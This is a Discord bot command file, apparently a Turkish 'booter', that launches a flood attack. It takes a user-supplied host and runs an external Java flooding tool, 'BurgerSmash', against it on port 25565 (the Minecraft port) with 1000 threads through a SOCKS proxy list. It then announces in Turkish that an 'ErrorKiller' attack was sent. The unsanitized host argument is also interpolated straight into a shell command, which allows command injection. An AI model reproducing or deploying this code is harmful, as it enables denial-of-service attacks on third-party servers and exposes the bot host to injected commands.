const Discord = require("discord.js");
const moment = require('moment'); //lmaoalperenin özel methodu XxXpREmiMumXxX

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
var exec = require('child_process').exec

  {
	exec(`cmd /c java -jar BurgerSmash-0.1.jar host-${host} port-25565 file-proxies.txt proxymode-socks threads-1000 loop-7000 debug-true time-600`, (error, stdout, stderr) => {
		if(error != null) {
		}
	});
		message.channel.send(`**ErrorKiller** saldırısı gönderildi, **${host}** port, **${port}** zaman **60** saniye :rocket:`)
	}
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['babanefe'],
  permLevel: 0
}

exports.help = {
  name: 'adminburgersmasher',
}